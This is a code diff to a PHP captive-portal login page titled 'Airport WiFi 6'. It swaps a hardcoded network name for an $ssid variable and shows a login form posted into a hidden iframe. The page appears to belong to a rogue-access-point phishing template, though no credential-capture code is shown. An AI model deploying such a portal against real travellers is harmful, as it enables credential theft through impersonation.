@@ -5,7 +5,6 @@ require_once('visited.php');
 header("Cache-Control: no-store, no-cache, must-revalidate");
 header("Pragma: no-cache");
 header("Expires: 0");
-$essid = "Airport WiFi 6";
 ?>
 
 <iframe name="login" id="login" style="display: none;"></iframe>
@@ -24,7 +23,7 @@ $essid = "Airport WiFi 6";
     <script type="text/javascript" src="/js/bootstrap.bundle.min.js"></script>
     <link rel="stylesheet" href="/style.css">
     <script type="text/javascript" src="/func.js"></script>
-    <title><?= $essid ?></title>
+    <title><?= $ssid ?></title>
 </head>
 
 <body>
@@ -34,7 +33,7 @@ $essid = "Airport WiFi 6";
                 <div class="card rounded-lg border-light shadow">
                     <div class="card-body text-center">
                         <img src="airport-logo.png" class="img-fluid mb-3" style="max-width: 200; max-height: 100px; object-fit: contain;">
-                        <h3 class="card-title text-center"><?= $essid; ?></h3>
+                        <h3 class="card-title text-center"><?= $ssid; ?></h3>
                         <p class="text-center small mb-5">It look’s like you need to be authorised to use this Wireless Access Point.</p>
                         <form method="POST" action="/captiveportal/index.php" onsubmit="submitForm()" target="login" id="loginForm">
                             <div class="form-group text-left mb-4">
